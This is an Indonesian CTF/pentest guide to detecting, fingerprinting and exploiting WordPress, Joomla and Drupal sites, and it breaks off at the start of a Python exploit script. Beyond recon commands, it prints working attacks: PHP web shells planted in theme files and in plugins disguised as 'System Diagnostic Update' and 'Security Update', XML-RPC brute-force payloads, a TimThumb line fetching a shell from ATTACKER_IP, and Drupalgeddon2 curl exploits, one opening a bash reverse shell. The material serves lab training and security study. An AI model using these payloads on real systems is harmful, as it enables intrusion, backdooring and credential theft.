---
id: "17"
title: "🌐 File 17: CMS Detection, Fingerprinting & Exploitation Workflow"
category: "3. Web Exploitation"
categoryId: "web"
filename: "17_cms_detection_workflow.md"
refs_out: ["05","06","14a","17a","17b","17c","26","44"]
refs_in: ["16","17a"]
---

# 🌐 File 17: CMS Detection, Fingerprinting & Exploitation Workflow

Dokumentasi ini adalah panduan operasional lanjutan setelah tahapan web fuzzing (File 16). Ketika fuzzing direktori dan vhost menemukan endpoint seperti `/wp-login.php`, `/administrator/`, atau `/sites/default/`, fokus pengujian beralih ke analisis Content Management System (CMS). Panduan ini memuat metodologi, command tools, teknik enumerasi manual, analisis CVE, hingga eksekusi eksploitasi menuju Remote Code Execution (RCE) di lingkungan CTF (HackTheBox, TryHackMe, Proving Grounds).

---

## 📑 Daftar Isi

1. [Bagian 1: Konsep CMS Detection](#bagian-1-konsep-cms-detection)
2. [Bagian 2: Tools CMS Detection](#bagian-2-tools-cms-detection)
3. [Bagian 3: WordPress Detection & Enumeration](#bagian-3-wordpress-detection--enumeration)
4. [Bagian 4: Joomla Detection & Enumeration](#bagian-4-joomla-detection--enumeration)
5. [Bagian 5: Drupal Detection & Enumeration](#bagian-5-drupal-detection--enumeration)
6. [Bagian 6: Other CMS Detection](#bagian-6-other-cms-detection)
7. [Bagian 7: CVE Lookup & Exploit Workflow](#bagian-7-cve-lookup--exploit-workflow)
8. [Bagian 8: Decision Tree Master CMS](#bagian-8-decision-tree-master-cms)
9. [Bagian 9: Automation Scripts](#bagian-9-automation-scripts)
10. [Bagian 10: Common Errors & Troubleshooting](#bagian-10-common-errors--troubleshooting)
11. [Bagian 11: Cheatsheet Akhir](#bagian-11-cheatsheet-akhir)

---

## 🧠 Bagian 1: Konsep CMS Detection

### 1.1 Apa itu CMS dan Kenapa Penting untuk Pentester

Content Management System (CMS) adalah perangkat lunak berbasis web yang mengelola pembuatan dan modifikasi konten digital tanpa mengharuskan pengguna menulis kode dari awal.

- **Analogi Sederhana:** Jika aplikasi web kustom adalah rumah yang dibangun bata demi bata dari rancangan arsitek independen, maka CMS adalah rumah modular prefabrikasi. Dinding, pintu, dan instalasi pipa dipasang dari modul standar pabrik. Jika modul kunci pintu tipe A cacat produksi (vulnerability), setiap rumah yang memakai modul tersebut dapat dibuka dengan teknik yang sama di seluruh dunia.
- **Mengapa CMS Menjadi Target Empuk:**
    1. **Known CVEs:** Kode sumber CMS bersifat publik (open source). Vulnerability yang ditemukan langsung dipublikasikan bersama exploit proof-of-concept (PoC).
    2. **Outdated Third-Party Extensions:** Inti CMS mungkin diperbarui, tetapi plugin, add-on, dan tema pihak ketiga sering kali ditelantarkan pengembangnya.
    3. **Default Credentials & Misconfigurations:** Banyak instalasi membiarkan file konfigurasi terekspos, installer dapat diakses ulang, atau kredensial admin tetap standar (`admin:admin`, `admin:password`).
    4. **High Privilege Functions:** Fitur internal CMS seperti theme editor atau plugin uploader secara desain mengeksekusi kode PHP/server-side jika akun administrator berhasil dikompromikan.

|Parameter|Custom Web Application|Content Management System (CMS)|
|---|---|---|
|**Arsitektur Kode**|Unik, logic vulnerability dominan|Terstandarisasi, komponen modular|
|**Metode Audit**|Black-box testing, source code review|Fingerprinting versi, plugin enum, CVE mapping|
|**Vektor Serangan**|IDOR, Logic Flaw, Custom Injection|Known CVE, Unauthenticated RCE, Plugin Exploit|
|**Peluang CTF**|Membutuhkan reverse logic & deep analysis|Identifikasi versi akurat →→ run PoC →→ Shell|

---

### 1.2 Sinyal CMS yang Muncul Setelah Fuzzing (File 16)

Hasil directory brute-force (menggunakan `ffuf`, `dirsearch`, atau `gobuster`) memberikan pola URI unik:

- **Sinyal WordPress:**
    - `/wp-login.php` (Halaman autentikasi utama)
    - `/wp-admin/` (Direktori administratif)
    - `/wp-content/` (Direktori aset, plugins, dan upload)
    - `/wp-includes/` (Library internal core WP)
    - `/xmlrpc.php` (API interface lawas, vektor brute force & SSRF)
- **Sinyal Joomla:**
    - `/administrator/` (Panel login backend Joomla)
    - `/components/` (Direktori fungsionalitas modular)
    - `/modules/` (Blok tampilan modular)
    - `/templates/` (Template tampilan)
    - `/language/` & `/plugins/`
- **Sinyal Drupal:**
    - `/sites/default/` (File setting dan upload Drupal)
    - `/core/` (Direktori internal Drupal 8+)
    - `/user/login` (Route autentikasi standar)
    - `/node/` (Routing konten inti)
    - `/CHANGELOG.txt` (Dokumentasi versi bawaan)
- **Sinyal CMS Lainnya:**
    - `/ghost/` →→ Ghost CMS (Node.js engine)
    - `/strapi/` atau `/admin/` di port 1337 →→ Strapi Headless CMS
    - `/typo3/` →→ TYPO3 Enterprise CMS
    - `/concrete/` atau `/index.php/login` →→ Concrete5
    - `/admin/login` →→ Generic backend panel (Laravel Nova, Django Admin, Flask-Admin)

---

### 1.3 Metodologi CMS Pentest
```text
```
+-------------------------------------------------------------+
|                 1. DETECT CMS IDENTIFIER                    |
|       (Headers, Cookie Names, Meta Tags, Asset Paths)       |
+------------------------------+------------------------------+
                               |
                               v
+-------------------------------------------------------------+
|                2. VERSION EXTRACTION / FINGERPRINT          |
|    (Release notes, Readme, Query Strings, Specific Hashes)  |
+------------------------------+------------------------------+
                               |
                               v
+-------------------------------------------------------------+
|             3. ENUMERATE PLUGINS, THEMES & EXTENSIONS       |
|   (Passive grep in DOM, Active dictionary-based fuzzing)    |
+------------------------------+------------------------------+
                               |
                               v
+-------------------------------------------------------------+
|                 4. USER ACCOUNT ENUMERATION                 |
|   (REST APIs, Author Archives, Endpoint Parameter Leakage)  |
+------------------------------+------------------------------+
                               |
                               v
+-------------------------------------------------------------+
|                 5. CVE & VULNERABILITY LOOKUP               |
|      (Searchsploit, NIST, Vuln Databases, GitHub PoCs)      |
+------------------------------+------------------------------+
                               |
                               v
+-------------------------------------------------------------+
|            6. EXPLOITATION & REMOTE CODE EXECUTION          |
|  (Pre-auth Exploit -> Auth Bypass -> File Upload -> Shell)  |
+-------------------------------------------------------------+
```

---

```

## 🛠️ Bagian 2: Tools CMS Detection

### 2.1 WhatWeb

WhatWeb mengenali teknologi web, server headers, platform blog, framework JavaScript, dan modul CMS.

#### Instalasi di Parrot OS

Bash

```
# WhatWeb sudah terpasang secara default di Parrot Security OS
# Update package jika versi tertinggal
sudo apt update && sudo apt install whatweb -y
```

#### Command Dasar dan Aggressive Scan

Bash

```
# 1. Passive / Stealth Scan (Hanya 1 request GET biasa)
whatweb http://10.10.11.200

# 2. Aggressive Scan (Level 3 - Melakukan fuzzing path dan plugin CMS)
whatweb -a 3 http://10.10.11.200 -v

# 3. Aggressive Scan dengan output JSON untuk parsing script
whatweb -a 3 http://10.10.11.200 --log-json /tmp/whatweb_result.json
```

#### Penjelasan Flag

- `-a 1` (Stealthy): Mengambil root path saja, membedah header dan response source code.
- `-a 3` (Aggressive): Mengirimkan serangkaian probe ke path spesifik CMS untuk memvalidasi keberadaan modul terkait.
- `-v` (Verbose): Menampilkan deskripsi lengkap dari setiap plugin fingerprint yang cocok.

#### Contoh Output Nyata
```text
```
http://10.10.11.200 [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], 
IP[10.10.11.200], JQuery[3.5.1], MetaGenerator[WordPress 5.8.1], Script, Title[Blog Test Environment], 
WordPress[5.8.1], X-Powered-By[PHP/7.4.3]
```

_Analisis:_ Target terbukti menggunakan **WordPress versi 5.8.1**, berjalan di atas server Apache 2.4.41 (Ubuntu) dengan modul PHP 7.4.3.

---

```

### 2.2 Wappalyzer CLI (webanalyze)

`webanalyze` adalah implementasi CLI berbasis bahasa Go dari extension browser Wappalyzer yang memetakan signature secara cepat.

#### Instalasi di Parrot OS

Bash

```
# 1. Pastikan compiler Go terinstall
sudo apt install golang-go -y

# 2. Download dan compile webanalyze
go install -v github.com/rverton/webanalyze/cmd/webanalyze@latest

# 3. Pindahkan binary ke system path
sudo cp ~/go/bin/webanalyze /usr/local/bin/

# 4. Download file signature teknologi terbaru
webanalyze -update
```

#### Command Dasar

Bash

```
# Analisis host target menggunakan crawl single page
webanalyze -host http://10.10.11.200 -crawl 1
```

#### Contoh Output Nyata
```text
```
http://10.10.11.200 (0.12s):
    - WordPress, 5.8.1 (CMS)
    - PHP, 7.4.3 (Programming Language)
    - Apache, 2.4.41 (Web Server)
    - MySQL (Database)
```

---

```

### 2.3 CMSeeK

CMSeeK adalah scanner CMS modern yang mampu mendeteksi lebih dari 180 CMS berbeda secara otomatis, serta langsung melakukan fingerprinting modul lanjutan.

#### Instalasi di Parrot OS

Bash

```
# Clone repository resmi CMSeeK
sudo git clone https://github.com/Tuhinshubhra/CMSeeK /opt/cmseek

# Masuk ke direktori dan install dependensi Python
cd /opt/cmseek
sudo pip3 install -r requirements.txt --break-system-packages

# Buat symbolic link agar bisa dipanggil global
sudo ln -s /opt/cmseek/cmseek.py /usr/local/bin/cmseek
```

#### Command Eksekusi

Bash

```
# Deteksi otomatis (non-interactive mode)
python3 /opt/cmseek/cmseek.py -u http://10.10.11.200 --batch

# Jika target mengabaikan default user-agent, gunakan random user-agent
python3 /opt/cmseek/cmseek.py -u http://10.10.11.200 --random-agent --batch
```

#### Contoh Output Nyata
```text
```
   ____ __  __ ____            _    
  / ___|  \/  / ___|  ___  ___| | __
 | |   | |\/| \___ \ / _ \/ _ \ |/ /
 | |___| |  | |___) |  __/  __/   < 
  \____|_|  |_|____/ \___|\___|_|\_\
  Version 1.1.3
  
[!] Scanning: http://10.10.11.200
[+] CMS Detected: WordPress
[+] WordPress Version: 5.8.1
[+] Readme File Found: http://10.10.11.200/readme.html
[+] WordPress Theme: twentytwentyone
[+] Admin Page: http://10.10.11.200/wp-login.php
```

```

#### Kelebihan vs WhatWeb

CMSeeK fokus secara eksklusif pada CMS: ia mampu mendeteksi file konfigurasi yang terekspos, API user enumeration, serta memeriksa kerentanan versi core secara instan, sedangkan WhatWeb berorientasi umum pada web application stack.

---

### 2.4 curl + Manual Detection

Verifikasi manual via terminal tanpa ketergantungan pada tool otomatisasi.

#### Mendeteksi dari HTTP Headers

Banyak CMS menambahkan custom header pada HTTP response:

Bash

```
# Periksa header secara detail
curl -s -I -X GET http://10.10.11.200 | grep -Ei "x-powered-by|x-generator|drupal|joomla|wp"
```

#### Mendeteksi dari Source Code (Meta Tags & Asset Directory)

Bash

```
# 1. Ekstraksi tag generator dari HTML DOM
curl -s http://10.10.11.200 | grep -i '<meta name="generator"'

# 2. Deteksi struktur path direktori khas WordPress
curl -s http://10.10.11.200 | grep -Eo '(wp-content|wp-includes)/[^"'"']+' | head -n 5

# 3. Deteksi struktur path Joomla
curl -s http://10.10.11.200 | grep -Eo '(media/system|templates/[^/]+)' | head -n 5
```

#### Mendeteksi dari Cookie Naming Convention

Setiap CMS memiliki mekanisme penamaan session default:

- **WordPress:** Menggunakan cookie `wordpress_logged_in_` atau `wordpress_test_cookie`.
- **Joomla:** Menghasilkan string hash acak sepanjang 32 karakter hexadecimal (contoh: `Set-Cookie: 13a48e7880df9b3b8c6e=...`).
- **Drupal:** Menggunakan format nama cookie `SESS<hash>` atau `SSESS<hash>`.

Bash

```
# Cetak cookie yang dikirim server
curl -s -I http://10.10.11.200 | grep -i "Set-Cookie"
```

---

### 2.5 Nikto (CMS Context)

Nikto mengecek file berisiko, salah konfigurasi, dan file deployment CMS yang tertinggal.

Bash

```
# Scan target dengan membatasi plugin ke web server misconfiguration dan dangerous files
nikto -h http://10.10.11.200 -Tuning 1,2,3,4,b -timeout 5
```

- **Apa yang dicari di output Nikto untuk CMS:**
    - File `xmlrpc.php`, `wp-config.php.bak`, `configuration.php.old`
    - Direktori instalasi yang belum dihapus (`/installation/` pada Joomla)
    - File release log: `license.txt`, `CHANGELOG.txt`, `readme.html`

---

## 🔴 Bagian 3: WordPress Detection & Enumeration

### 3.1 Konfirmasi WordPress

Gunakan lima metode verifikasi independen untuk memastikan core backend adalah WordPress:

Bash

```
# Cara 1: Request path login standar (Harus return HTTP 200)
curl -s -o /dev/null -w "%{http_code}
" http://10.10.11.200/wp-login.php

# Cara 2: Request file xmlrpc.php (Harus return pesan 'XML-RPC server accepts POST requests only.')
curl -s http://10.10.11.200/xmlrpc.php

# Cara 3: Query REST API Users endpoint
curl -s -I http://10.10.11.200/wp-json/ | grep -i "rest_route"

# Cara 4: Cek keberadaan file license.txt bawaan core WordPress
curl -s http://10.10.11.200/license.txt | head -n 3

# Cara 5: Cari string pola wp-includes dalam DOM
curl -s http://10.10.11.200 | grep -c "wp-includes"
```

---

### 3.2 Versi WordPress

Ekstraksi nomor rilis spesifik untuk pencarian CVE core.

Bash

```
# 1. Dari RSS Feed (Sering kali membocorkan versi secara akurat)
curl -s http://10.10.11.200/feed/ | grep -i "<generator>https://wordpress.org/?v="

# Output Contoh:
# <generator>https://wordpress.org/?v=5.8.1</generator>

# 2. Dari file readme.html
curl -s http://10.10.11.200/readme.html | grep -i "Version"

# 3. Dari Generator Tag HTML
curl -s http://10.10.11.200 | grep -i 'meta name="generator" content="WordPress'

# 4. Dari query string aset JavaScript di wp-includes
curl -s http://10.10.11.200 | grep -o 'wp-includes/js/wp-embed.min.js?ver=[0-9.]*'
```

---

### 3.3 WPScan — Tool Utama WordPress

#### Instalasi & Registrasi Token

WPScan telah terpasang di Parrot OS. Database vulnerability publik memerlukan API token gratis untuk memunculkan referensi CVE.

1. Daftarkan akun di [https://wpscan.com](https://wpscan.com/).
2. Ambil token API dari dashboard profil pengguna.

Bash

```
# Update database vulnerability WPScan
wpscan --update
```

#### Rangkaian Command WPScan

Bash

```
# 1. Basic Scan (Deteksi versi dan tema aktif)
wpscan --url http://10.10.11.200 --api-token "YOUR_API_TOKEN"

# 2. Enumerasi User (Mencari ID user 1 sampai 10)
wpscan --url http://10.10.11.200 --enumerate u

# 3. Enumerasi Plugin Rentan (Vulnerable Plugins)
wpscan --url http://10.10.11.200 --enumerate vp --api-token "YOUR_API_TOKEN"

# 4. Enumerasi Plugin Agresif (Mengecek plugin populer via SecLists dictionary)
wpscan --url http://10.10.11.200 --enumerate ap --plugins-detection aggressive

# 5. Enumerasi Tema Rentan (Vulnerable Themes)
wpscan --url http://10.10.11.200 --enumerate vt --api-token "YOUR_API_TOKEN"

# 6. Password Brute Force Terhadap User yang Sudah Ditemukan
wpscan --url http://10.10.11.200 -U admin -P /usr/share/wordlists/rockyou.txt
```

#### Contoh Output Nyata WPScan
```text
```
[i] It seems like you have not provided an API Token...
[+] URL: http://10.10.11.200/ [10.10.11.200]
[+] WordPress version 5.8.1 identified (Insecure, released on 2021-09-09).
 | Found By: Meta Generator (Passive Detection)

[+] WordPress theme in use: twentytwentyone
 | Location: http://10.10.11.200/wp-content/themes/twentytwentyone/
 | Latest Version: 1.4

[+] Enumerating Vulnerable Plugins (via passive and aggressive methods)
 Checking 100 plugins ...
[!] 1 plugin identified:
[+] contact-form-7
 | Location: http://10.10.11.200/wp-content/plugins/contact-form-7/
 | Last Updated: 2020-09-02
 | Version: 5.3.1 (100% confidence)
 | [!] 1 vulnerability identified:
 | [!] Title: Contact Form 7 <= 5.3.1 - Unrestricted File Upload (CVE-2020-35489)
 |     Reference: https://wpscan.com/vulnerability/10508
```

---

```

### 3.4 Plugin & Theme Enumeration Manual

Bash

```
# 1. Ekstraksi nama folder plugin langsung dari source code HTML (Passive)
curl -s http://10.10.11.200 | grep -o 'wp-content/plugins/[^/]*' | cut -d/ -f3 | sort -u

# 2. Cek apakah Directory Listing aktif pada wp-content/plugins/
curl -s http://10.10.11.200/wp-content/plugins/ | grep -i "Index of"

# 3. Cari versi spesifik plugin dari file readme.txt bawaannya
curl -s http://10.10.11.200/wp-content/plugins/wp-file-manager/readme.txt | grep -i "Stable tag:"

# 4. Fuzzing Plugin menggunakan ffuf dan SecLists
ffuf -w /usr/share/seclists/Discovery/Web-Content/CMS/wp-plugins.fuzz.txt \
     -u http://10.10.11.200/wp-content/plugins/FUZZ \
     -mc 200,403,301 -t 40
```

---

### 3.5 User Enumeration WordPress

#### Method 1: Author Query Parameter

WordPress secara native me-redirect query author ke slug nama pengguna jika user tersebut pernah menulis artikel.

Bash

```
# Query author ID 1 sampai 3
curl -s -i "http://10.10.11.200/?author=1" | grep -Ei "Location:|Location: "
```

_Output Contoh:_ `Location: http://10.10.11.200/author/admin/` →→ Username valid adalah **admin**.

#### Method 2: REST API `/wp-json/`

Bash

```
# Request daftar entitas user lewat REST API bawaan WordPress
curl -s http://10.10.11.200/wp-json/wp/v2/users | jq '.[].slug'
```

_Output Contoh:_

JSON

```
"admin"
"editor_jim"
```

#### Method 3: XML-RPC `wp.getUsersBlogs`

Memanfaatkan query API XML-RPC lama:

Bash

```
cat <<EOF > /tmp/xmlrpc_user.xml
<?xml version="1.0"?>
<methodCall>
   <methodName>wp.getUsersBlogs</methodName>
   <params>
      <param><value><string>admin</string></value></param>
      <param><value><string>password123</string></value></param>
   </params>
</methodCall>
EOF

curl -s -X POST -d @/tmp/xmlrpc_user.xml http://10.10.11.200/xmlrpc.php
```

---

### 3.6 WordPress CVE Patterns yang Sering Muncul di CTF

|CVE / Identifier|Target Component|Versi Rentan|Tipe Vuln|Exploit Command / Syntax PoC|
|---|---|---|---|---|
|**CVE-2020-25213**|WP File Manager|6.0 - 6.8|Pre-Auth RCE|`curl -s -F "cmd=upload" -F "target=l1_Lw" -F "upload[]=@shell.php" http://TARGET/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php`|
|**CVE-2021-24507**|Astra Widgets|< 1.5.2|Authenticated SQLi|`sqlmap -u "http://TARGET/wp-admin/admin-ajax.php" --data="action=astra_widget_css&style=1*" --cookie="wordpress_logged_in_..." -p style --dbs`|
|**CVE-2020-35489**|Contact Form 7|< 5.3.2|Unrestricted Upload|Upload file via form payload: nama file diakhiri karakter null/spasi ganda seperti `shell.php .jpg`|
|**CVE-2019-8942**|WP Core (Image)|< 5.0.1|Auth Post-Meta RCE|Eksploitasi via Metasploit: `use exploit/unix/webapp/wp_crop_rce`|
|**XML-RPC Brute**|Core / xmlrpc.php|Semua (jika aktif)|Auth Bypass / DoS|`curl -X POST -d @system.multicall.xml http://TARGET/xmlrpc.php` (Bypass rate-limit)|
|**TimThumb RCE**|timthumb.php|<= 2.0|Remote Code Exec|`curl "http://TARGET/wp-content/themes/sample/timthumb.php?src=http://ATTACKER_IP/shell.php"`|

---

### 3.7 WordPress Login Brute Force

#### Menggunakan Hydra pada Form HTTP POST

Bash

```
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.11.200 http-post-form \
"/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=incorrect"
```

#### Menggunakan XML-RPC Multicall (Teknik Tercepat di CTF)

Metode multicall mengirimkan ratusan kombinasi username-password dalam **satu request HTTP tunggal**, melewati pembatasan rate-limiting web-login tradisional:

Bash

```
cat << 'EOF' > /tmp/multicall.xml
<?xml version="1.0"?>
<methodCall>
<methodName>system.multicall</methodName>
<params><param><value><array><data>
  <value><struct>
    <member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member>
    <member><name>params</name><value><array><data>
      <value><string>admin</string></value>
      <value><string>admin</string></value>
    </data></array></value></member>
  </struct></value>
  <value><struct>
    <member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member>
    <member><name>params</name><value><array><data>
      <value><string>admin</string></value>
      <value><string>password</string></value>
    </data></array></value></member>
  </struct></value>
</data></array></value></param></params>
</methodCall>
EOF

curl -s -X POST -d @/tmp/multicall.xml http://10.10.11.200/xmlrpc.php | grep -i "isAdmin"
```

---

### 3.8 WordPress ke RCE (Jika Berhasil Login Admin)

#### Method 1: Theme Editor Modification (Path Klasik)

1. Buka dashboard: `Appearance` →→ `Theme File Editor`.
2. Pilih tema yang tidak sedang aktif (atau tema default aktif).
3. Pilih template error: `404.php`.
4. Tambahkan payload PHP system backdoor:

PHP

```
<?php system($_GET['cmd']); ?>
```

5. Simpan file (`Update File`).
6. Eksekusi kode melalui browser atau curl:

Bash

```
curl "http://10.10.11.200/wp-content/themes/twentytwentyone/404.php?cmd=id"
# Output Contoh: uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

#### Method 2: Malicious Plugin Upload

Jika fitur theme editor dinonaktifkan (`DISALLOW_FILE_EDIT = true` di wp-config), buat file plugin berbahaya dalam bentuk arsip `.zip`:

Bash

```
# 1. Siapkan direktori kerja
mkdir /tmp/malicious_plugin
cd /tmp/malicious_plugin

# 2. Buat file PHP berisi Reverse Shell
cat << 'EOF' > shell_plugin.php
<?php
/**
 * Plugin Name: System Diagnostic Update
 * Version: 1.0
 * Author: Pentest Engineer
 */
if (isset($_GET['shell'])) {
    system($_GET['shell']);
}
?>
EOF

# 3. Arsipkan ke format ZIP
zip -r /tmp/evil_plugin.zip shell_plugin.php

# 4. Upload melalui dashboard admin:
#    Plugins -> Add New -> Upload Plugin -> evil_plugin.zip -> Install Now -> Activate
# 5. Picu shell
curl "http://10.10.11.200/wp-content/plugins/shell_plugin.php?shell=whoami"
```

---

## 🔷 Bagian 4: Joomla Detection & Enumeration

### 4.1 Konfirmasi Joomla

Bash

```
# Cara 1: Akses direktori login administrator (Harus return HTTP 200 form Joomla)
curl -s -I http://10.10.11.200/administrator/ | grep -Ei "Joomla!|Location:"

# Cara 2: Ambil header 'X-Content-Type-Options' dan signature template
curl -s http://10.10.11.200/ | grep -i "/media/system/js/"

# Cara 3: Ambil file manifest template standar
curl -s -I http://10.10.11.200/templates/protostar/templateDetails.xml

# Cara 4: Cek keberadaan file /robots.txt bawaan Joomla (Memuat daftar larangan khas)
curl -s http://10.10.11.200/robots.txt | grep -i "Joomla! Project"
```

---

### 4.2 Versi Joomla

Bash

```
# 1. Parsing langsung file core manifest XML (Sangat umum di versi 3.x kebawah)
curl -s http://10.10.11.200/administrator/manifests/files/joomla.xml | grep -i "<version>"

# 2. Parsing file release core
curl -s http://10.10.11.200/language/en-GB/en-GB.xml | grep -i "<version>"
```

---

### 4.3 JoomScan — Tool Utama Joomla

#### Instalasi di Parrot OS

Bash

```
sudo apt update && sudo apt install joomscan -y
```

#### Eksekusi JoomScan

Bash

```
# Scan target secara komprehensif
joomscan -u http://10.10.11.200

# Scan target dengan user-agent khusus
joomscan -u http://10.10.11.200 --user-agent "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
```

#### Contoh Output Nyata JoomScan
```text
```
..---..      .-.               .             
:__             : :               :             
   : :.-..-. .-. : :   .--.  .--. :   .---. .--.
.-' : : :: : : : : :   `--. :    :'   :     :   
`---' `-'`-' `-' `-'.-.`--'  `--' `-' `---' `-' 
                    `---'
[+] FireWall Detector: Not Found
[+] Detecting Joomla Version: 3.9.12
[+] Core Vulnerabilities:
 | Exploit Title: Joomla! 3.0.0 - 3.4.6 - Remote Code Execution
 | ExploitDB: https://www.exploit-db.com/exploits/38977/
[+] Directory Listing Enabled:
 | http://10.10.11.200/administrator/components/
```

---

```

### 4.4 User Enumeration Joomla

Pada instalasi default Joomla, pendaftaran user sering aktif tanpa verifikasi email atau memiliki API endpoint yang mengekspos ID pengguna:

Bash

```
# 1. Cek aktivasi pendaftaran user umum
curl -s http://10.10.11.200/index.php?option=com_users&view=registration | grep -i "registration"

# 2. Cek endpoint contact list component yang sering mengekspos username admin
curl -s "http://10.10.11.200/index.php?option=com_contact&view=category&id=1" | grep -Ei "email|name"
```

---

### 4.5 Joomla CVE yang Sering Muncul di CTF

|CVE / Identifier|Deskripsi / Modul|Versi Terkena|Exploit Command / Metodologi|
|---|---|---|---|
|**CVE-2023-23752**|Unauthenticated API Info Leak|4.0.0 s.d. 4.2.8|`curl -s "http://TARGET/api/index.php/v1/users?public=true"` dan ambil konfigurasi DB via `/api/index.php/v1/config/application?public=true`|
|**CVE-2015-8562**|PHP Object Injection via User-Agent|1.5.0 s.d. 3.4.5|Eksekusi kode via header HTTP `User-Agent: }__test|
|**CVE-2017-8917**|SQL Injection (com_fields)|3.7.0|`sqlmap -u "http://TARGET/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=*" --risk=3 --level=5 --dbs`|
|**CVE-2018-8045**|Path Traversal / File Inclusion|3.8.x|Path traversal via parameter language|

#### Analisis Mendalam: CVE-2023-23752 (Sangat Populer di Mesin Baru)

Kelemahan validasi REST API pada Joomla 4 memungkinkan penyerang tanpa hak akses membaca password database MySQL secara plaintext:

Bash

```
# Ekstraksi kredensial database Joomla langsung via curl
curl -s "http://10.10.11.200/api/index.php/v1/config/application?public=true" | jq '.data[].attributes'
```

_Output Leaked Data:_

JSON

```
{
  "user": "root",
  "password": "SuperSecretDatabasePassword2023!",
  "db": "joomla_db"
}
```

---

### 4.6 Joomla ke RCE (Jika Mendapatkan Kredensial Admin)

#### Method 1: Template Modification

1. Navigasi ke: `Extensions` →→ `Templates` →→ `Templates`.
2. Klik pada tema yang digunakan (contoh: `Protostar Details and Files`).
3. Pilih file `error.php` atau `index.php`.
4. Sisipkan fungsi command execution:

PHP

```
<?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; system($_REQUEST['cmd']); echo "</pre>"; die; } ?>
```

5. Akses URL:

Bash

```
curl "http://10.10.11.200/templates/protostar/error.php?cmd=id"
```

#### Method 2: Upload Malicious Extension (ZIP)

Buat struktur ekstensi Joomla minimum:

Bash

```
mkdir /tmp/joomla_evil && cd /tmp/joomla_evil

# Buat manifest XML extension
cat << 'EOF' > evil.xml
<?xml version="1.0" encoding="utf-8"?>
<extension type="plugin" group="system" method="upgrade">
    <name>Security Update</name>
    <version>1.0</version>
    <files>
        <filename plugin="evil">evil.php</filename>
    </files>
</extension>
EOF

# Buat payload PHP
cat << 'EOF' > evil.php
<?php
defined('_JEXEC') or die;
if (isset($_GET['exec'])) {
    system($_GET['exec']);
    exit;
}
?>
EOF

# Pack ke format ZIP
zip -r /tmp/joomla_plugin.zip evil.xml evil.php
```

Upload via: `Extensions` →→ `Manage` →→ `Install` →→ `Upload Package File`.

---

## 💧 Bagian 5: Drupal Detection & Enumeration

### 5.1 Konfirmasi Drupal

Bash

```
# Cara 1: Cek header HTTP 'X-Generator'
curl -s -I http://10.10.11.200 | grep -i "X-Generator: Drupal"

# Cara 2: Cek header X-Drupal-Cache
curl -s -I http://10.10.11.200 | grep -i "X-Drupal"

# Cara 3: Akses direktori standar sites default
curl -s -o /dev/null -w "%{http_code}
" http://10.10.11.200/sites/default/
```

---

### 5.2 Versi Drupal

Bash

```
# 1. Dari CHANGELOG.txt (Aktif pada instalasi Drupal 7 dan versi awal Drupal 8)
curl -s http://10.10.11.200/CHANGELOG.txt | head -n 10

# 2. Dari core CHANGELOG.txt (Drupal 8+)
curl -s http://10.10.11.200/core/CHANGELOG.txt | head -n 10

# 3. Dari file core/lib/Drupal.php (Bila source code terpapar via LFI atau directory listing)
curl -s http://10.10.11.200/core/lib/Drupal.php | grep -i "const VERSION"
```

---

### 5.3 Droopescan — Tool Utama Drupal

#### Instalasi di Parrot OS

Bash

```
# Cara 1: Via pip (kadang conflict di Parrot OS)
sudo pip3 install droopescan --break-system-packages

# Cara 2: Via git clone (RECOMMENDED - lebih reliable)
git clone https://github.com/SamJoan/droopescan.git /opt/droopescan
cd /opt/droopescan
pip3 install -r requirements.txt --break-system-packages
sudo ln -s /opt/droopescan/droopescan /usr/local/bin/droopescan

# Verifikasi instalasi
droopescan --help
```

#### Eksekusi Droopescan

Bash

```
# Scan target dengan thread tinggi
droopescan scan drupal -u http://10.10.11.200 -t 32
```

#### Contoh Output Nyata Droopescan
```text
```
[+] Plugins found:
    ctools http://10.10.11.200/sites/all/modules/ctools/
    views http://10.10.11.200/sites/all/modules/views/

[+] Themes found:
    bartik http://10.10.11.200/themes/bartik/

[+] Possible version(s):
    7.54
    7.55
    7.56
    7.57
```

---

```

### 5.4 Drupalgeddon Series (WAJIB DIKETAHUI CTF)

Seri kerentanan Drupalgeddon adalah vektor eksploitasi Remote Code Execution (RCE) paling sering ditemui dalam CTF (HTB: Armageddon, Bastard, dll.).

#### 1. CVE-2018-7600 (Drupalgeddon2) — RCE

- **Target Versi:** Drupal < 7.58 / 8.x < 8.5.1
- **Akar Masalah:** Kurangnya sanitasi parameter AJAX Renderable Arrays (`#` render array element), memungkinkan eksekusi fungsi PHP arbitrary via `Form API`.

##### Verifikasi dan Eksploitasi Menggunakan PoC Bash/Curl (Pre-Auth RCE)

Command curl langsung untuk menguji apakah target rentan dan membaca identitas sistem:

Bash

```
# Drupalgeddon2 PoC untuk Drupal 8.x
curl -s -k -X POST \
  "http://10.10.11.200/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax" \
  --data "form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=exec&mail[#type]=markup&mail[#markup]=id"
```

_Expected Output:_

JSON

```
[{"command":"insert","method":"replaceWith","selector":null,"data":"\u003Cspan class=\u0022ajax-new-content\u0022\u003E\u003C\/span\u003E","settings":null}]
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

##### Command Reverse Shell Drupalgeddon2 (Drupal 7.x)

Bash

```
# PoC eksploitasi Drupal 7 via password reset form
curl -s -k -X POST "http://10.10.11.200/?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.5/4444+0>%261'" \
  --data "form_id=user_pass&_triggering_element_name=name"
```

##### Skrip Python Mandiri untuk Eksploitasi Otomatis (drupalgeddon2.py)

Python

```
#!/usr/bin/env python3
# drupalgeddon2_exploit.py
import sys
import requests

if len(sys.argv) < 3:
    print(f"Usage: {sys.argv[0]} <target-url> <command>")
    sys.exit(1)

target = sys.argv[1].rstrip('/')
cmd = sys.argv[2]

